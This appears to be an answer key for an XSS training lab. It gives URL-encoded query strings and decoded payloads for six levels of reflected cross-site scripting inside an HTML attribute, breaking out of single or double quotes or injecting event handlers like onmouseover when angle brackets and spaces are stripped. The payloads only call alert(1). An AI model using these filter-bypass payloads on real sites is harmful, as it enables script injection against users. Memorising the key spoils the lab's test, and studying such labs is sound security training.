# inattr — solutions

Reflection inside a `<div class>` attribute under various quoting and filter combinations.

### inattr-xss-level1

`/inattr/level1/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: double-quoted attribute; break out

### inattr-xss-level2

`/inattr/level2/?query=%27%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `'><script>alert(1)</script>`
- context: single-quoted attribute; break out

### inattr-xss-level3

`/inattr/level3/?query=%22%20onmouseover=alert(1)%20x=%22`

- payload: `" onmouseover=alert(1) x="`
- context: double-quoted attr, angles stripped — inject new attribute

### inattr-xss-level4

`/inattr/level4/?query=%27%20onmouseover=alert(1)%20x=%27`

- payload: `' onmouseover=alert(1) x='`
- context: single-quoted attr, angles stripped — inject new attribute

### inattr-xss-level5

`/inattr/level5/?query=%22/onmouseover=alert(1)//x=%22`

- payload: `"/onmouseover=alert(1)//x="`
- context: double-quoted, angles+spaces stripped — `/` separates attrs

### inattr-xss-level6

`/inattr/level6/?query=%27/onmouseover=alert(1)//x=%27`

- payload: `'/onmouseover=alert(1)//x='`
- context: single-quoted, angles+spaces stripped — `/` separates attrs
